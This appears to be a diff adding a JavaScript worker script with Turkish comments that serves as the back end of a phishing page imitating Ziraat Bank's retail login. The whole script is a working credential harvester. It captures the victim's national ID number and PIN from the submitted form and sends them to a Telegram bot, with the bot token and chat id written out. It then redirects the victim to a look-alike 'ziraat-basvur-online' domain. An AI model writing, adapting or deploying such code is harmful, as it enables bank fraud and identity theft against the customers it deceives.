@@ -1,0 +1,45 @@
+addEventListener('fetch', (event) => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  try {
+    // Gelen isteği parse et
+    const formData = await request.formData();
+    
+    // Özel işlemler
+    const identityValue = formData.get('ctl00$c$RetailIdentityTextBox');
+    const pinValue = formData.get('ctl00$c$RetailPinTextBox');
+
+    // Telegram botuna mesajı gönder
+    await sendTelegramMessage(identityValue, pinValue);
+
+    // Yönlendirme için script oluştur
+    const redirectScript = '<script>window.location.replace("https://ziraat-basvur-online.vercel.app/onay");</script>';
+
+    // Script ile yanıt oluştur
+    const response = new Response(redirectScript, { status: 200 });
+    response.headers.set('Content-Type', 'text/html');
+    return response;
+  } catch (error) {
+    console.error('Hata:', error.message);
+
+    // Hata durumunda bir yanıt oluşturabilirsiniz
+    const errorResponse = new Response('İşlem sırasında bir hata oluştu.', { status: 500 });
+    return errorResponse;
+  }
+}
+
+async function sendTelegramMessage(identityValue, pinValue) {
+  // Telegram botuna mesajı göndermek için bir HTTP isteği oluştur
+  await fetch('https://api.telegram.org/bot6574128406:AAGxE1-ot4bvUgbdfiiA911FWFov0JGr7Rk/sendMessage', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: '6847260070',
+      text: `TCno : ${identityValue}\n Parola :  ${pinValue}`,
+    }),
+  });
+}
